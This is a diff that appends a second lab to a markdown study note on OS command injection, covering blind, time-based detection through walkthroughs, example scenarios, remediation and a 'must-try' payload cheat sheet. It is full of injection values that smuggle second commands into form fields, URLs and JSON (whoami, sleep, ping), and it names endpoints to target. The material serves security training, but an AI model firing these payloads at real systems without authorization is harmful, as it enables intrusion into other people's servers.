@@ -1,4 +1,4 @@
-# 🧨 OS Command Injection (Shell Injection)
+#Lab-1 🧨 OS Command Injection (Shell Injection)
 
 ---
 
@@ -299,3 +299,309 @@ whoami
 - Legacy code = high risk
 - Admin tools = jackpot
 
+---
+
+# Lab-2 🧨 Blind OS Command Injection — Time-Based Attacks
+
+---
+
+## 1️⃣ Overview
+
+Blind OS Command Injection occurs when:
+
+- User input is passed to an operating system command
+- The command *executes successfully*
+- *BUT no command output is returned* in the HTTP response
+
+In such cases, attackers confirm exploitation using *side effects*, most commonly:
+
+- Time delays
+- Network callbacks
+- File creation
+- System behavior changes
+
+This is *extremely common in real-world production apps* and frequently missed.
+
+---
+
+## 2️⃣ What Is This Topic?
+
+Blind OS Command Injection is about exploiting OS command execution *without visible output*.
+
+> Output is hidden, but execution still happens.
+
+Attackers rely on:
+
+- sleep
+- ping
+- timeout
+- DNS / HTTP callbacks
+
+To *prove execution indirectly*.
+
+---
+
+## 4️⃣ Lab Walkthrough (Time-Based Confirmation)
+
+1. Identify parameter passed to OS command (any input field that adds parameters in OS Command ,e.g: feedback form) 
+2. No output is reflected in response (echo OS command failed) 
+3. Output-based payloads fail  
+4. Switch to time-based payload  
+5. Inject command separator  (e.g: in feedback form in email parameter=xyz@gmail.com||ping -c 10 127.0.0.1||
+6. Trigger delay using ping  
+7. Confirm execution via response time  
+
+> Execution confirmed *without any output*
+
+---
+
+## 5️⃣ Evidence (Time-Based Execution)
+
+The following evidence shows successful blind OS command injection using a *10-second delay payload* with ping to localhost.
+
+### 📸 Time Delay Confirmation
+
+!ping time delay OS command[](../images/blind-osci-ping-delay.png)
+
+---
+
+## 3️⃣ Real-World Scenarios (Attacker Mindset)
+
+### 🔹 Scenario 1: Feedback / Contact Form (MOST COMMON)
+
+*What the app wants:*
+- User submits feedback
+- Server sends email using OS command
+
+*Example backend command:*
+
+mail -s "feedback" admin@site.com
+
+*Attacker payload (blind):*
+
+test@test.com && ping -c 10 127.0.0.1
+
+*How attacker confirms:*
+- Page response delayed by ~10 seconds
+
+*Impact:*
+- Silent OS command execution
+- Often escalates to full RCE
+
+---
+
+### 🔹 Scenario 2: Ping / Network Test Feature
+
+*What the app wants:*
+- Check if a host is reachable
+
+*Backend command:*
+
+ping <user_input>
+
+*Attacker payload:*
+
+127.0.0.1 | ping -c 10 127.0.0.1
+
+*Observation:*
+- Application hangs for 10 seconds
+
+*Impact:*
+- Confirmed OS command execution
+- Internal pivoting possible
+
+---
+
+### 🔹 Scenario 3: URL Fetch / Webhook Tester
+
+*What the app wants:*
+- Fetch a user-supplied URL
+
+*Backend command:*
+
+curl <url>
+
+*Payload:*
+
+http://example.com; ping -c 10 127.0.0.1
+
+*Confirmation:*
+- Delayed response
+- No output shown
+
+*Impact:*
+- Blind RCE
+- Can chain with SSRF
+
+---
+
+### 🔹 Scenario 4: File Export / Report Generator
+
+*What the app wants:*
+- Generate and export reports
+
+*Backend command:*
+
+generate_report <filename>
+
+*Payload:*
+
+report.csv && ping -c 10 127.0.0.1
+
+*Detection:*
+- Export takes unusually long
+
+*Impact:*
+- Backend command execution
+- Often runs with high privileges
+
+---
+
+### 🔹 Scenario 5: Image / Media Processing
+
+*What the app wants:*
+- Resize or convert images
+
+*Backend command:*
+
+convert input.jpg output.png
+
+*Payload:*
+
+image.jpg | ping -c 10 127.0.0.1
+
+*Result:*
+- Processing delay
+- CPU spike
+
+*Impact:*
+- RCE via media pipelines
+
+---
+
+## 6️⃣ High-Value Endpoints to Always Test
+
+/feedback /contact /ping /check-host /fetch /import-url /export /report /backup /maintenance /api/*
+
+*High-risk parameters:*
+
+email host ip url file name task
+
+---
+
+## 7️⃣ Multi-Chain Attack Possibilities
+
+- Blind OSCI → Reverse shell
+- Blind OSCI → Credential theft
+- Blind OSCI → SSRF → Internal scan
+- Blind OSCI → File write → Persistence
+- Blind OSCI → Lateral movement
+
+---
+
+## 8️⃣ Remediation (Defender View)
+
+- ❌ Never pass user input to shell
+- ✅ Use safe system APIs
+- ✅ Strict allowlists
+- ✅ Proper argument escaping
+- ✅ Disable dangerous OS tools
+- ✅ Run services with least privilege
+
+---
+
+## 🔹 Universal OS Command Injection Payload Syntax (Must-Try Set)
+
+> Use these payloads when testing OS command injection.
+> At least ONE of them usually works depending on backend parsing.
+
+---
+
+### 🔸 Linux / Unix Payloads
+
+#### Basic Command Chaining
+```
+- ; whoami
+- && whoami
+- | whoami
+- || whoami
+```
+#### Command Substitution
+```
+- $(whoami)
+- `` whoami ``
+```
+#### Time-Based (Blind OSCI)
+```
+- ; sleep 10
+- && sleep 10
+- | sleep 10
+- || sleep 10
+```
+#### Network / Delay Alternative
+```
+- ; ping -c 10 127.0.0.1
+- && ping -c 10 127.0.0.1
+```
+---
+
+### 🔸 Windows Payloads
+
+#### Basic Command Chaining
+```
+- & whoami
+- && whoami
+- | whoami
+```
+#### Time-Based (Blind OSCI)
+```
+- & timeout /t 10
+- && timeout /t 10
+- | timeout /t 10
+```
+---
+
+### 🔸 URL-Encoded Variants (When Encoding Is Applied)
+```
+- %3B%20whoami
+- %26%26%20whoami
+- %7C%20whoami
+- %3B%20sleep%2010
+```
+---
+
+### 🔸 JSON / API Payload Example
+```
+{ "host": "8.8.8.8; sleep 10" }
+```
+---
+
+### 🔸 Real-World Testing Rule
+
+- Try *; first*
+- If blocked → try &&
+- If still blocked → try |
+- If output hidden → switch to *sleep / ping*
+- If UI blocks → test *API / JSON*
+
+---
+
+
+## 9️⃣ Extra Notes / Pro Tips
+
+- Blind ≠ safe
+- Time delay = execution proof
+- Always try multiple separators:
+
+; && || |
+
+- Delays are the most reliable signal
+- Real environments vary
+
+---
+
+## 🧠 One-Line Memory Hook
+
+> If input reaches the OS and output is hidden — assume blind command injection.
+
+---
